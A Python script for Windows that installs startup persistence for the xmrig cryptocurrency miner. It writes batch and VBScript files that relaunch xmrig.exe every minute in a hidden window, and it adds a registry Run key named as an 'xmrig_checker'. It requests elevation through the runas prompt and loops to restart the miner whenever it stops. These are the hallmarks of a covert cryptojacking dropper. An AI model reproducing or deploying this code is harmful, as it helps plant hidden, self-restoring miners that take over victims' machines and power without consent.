import os
import subprocess
import requests
import getpass
import winreg as reg
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_process(process_name):
    try:
        result = subprocess.run(["tasklist", "/NH", "/FI", f'IMAGENAME eq {process_name}'], capture_output=True, text=True, check=True)
        return process_name in result.stdout
    except subprocess.CalledProcessError:
        return False

def add_to_startup(file_path):
    username = getpass.getuser()
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = reg.HKEY_CURRENT_USER
        key_value = f"xmrig_checker_{username}"
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(reg_key, key_value, 0, reg.REG_SZ, file_path)
        reg.CloseKey(reg_key)
        print("Added to startup registry.")
    except Exception as e:
        print(f"Error adding to startup registry: {e}")

if __name__ == "__main__":
    exe_name = "xmrig.exe"
    xmrig_path = r"C:\Program Files\Common Files\xmrig"
    
    if not os.path.exists(xmrig_path):
        os.makedirs(xmrig_path)

    startup_file_path = os.path.join(xmrig_path, "xmrig_check.bat")
    check_startup_file_path = os.path.join(xmrig_path, "check_xmrig.bat")
    vbs_file_path = os.path.join(xmrig_path, "xmrig_check.vbs")

    check_xmrig_content = f"""@echo off
    :Check
    timeout /T 60
    tasklist /NH /FI "IMAGENAME eq {exe_name}" | find /i "{exe_name}" > nul
    if errorlevel 1 (
        cd /d "{xmrig_path}"
        start "" {exe_name}
    )
    goto Check
    """

    with open(startup_file_path, 'w') as file:
        file.write(check_xmrig_content)

    check_xmrig = f"""@echo off
cd %~dp0 && start "" xmrig_check.vbs && exit
    """

    with open(check_startup_file_path, 'w') as file1:
        file1.write(check_xmrig)

    add_to_startup(check_startup_file_path)

    vbs_content = f"""Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /C xmrig_check.bat", 0, True
Set objShell = Nothing
"""

    with open(vbs_file_path, 'w') as file2:
        file2.write(vbs_content)

    if is_admin():
        subprocess.Popen(f'start cmd /c "{check_startup_file_path}"')
        print("Task started in a new console window.")
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1)

    while True:
        if not check_process(exe_name):
            print(f"{exe_name} is Not Running. Starting...")
            try:
                subprocess.Popen(f'start /MIN cmd /c "{check_startup_file_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError as e:
                print(f"Error starting {exe_name}: {e}")
        else:
            print(f"{exe_name} is running")
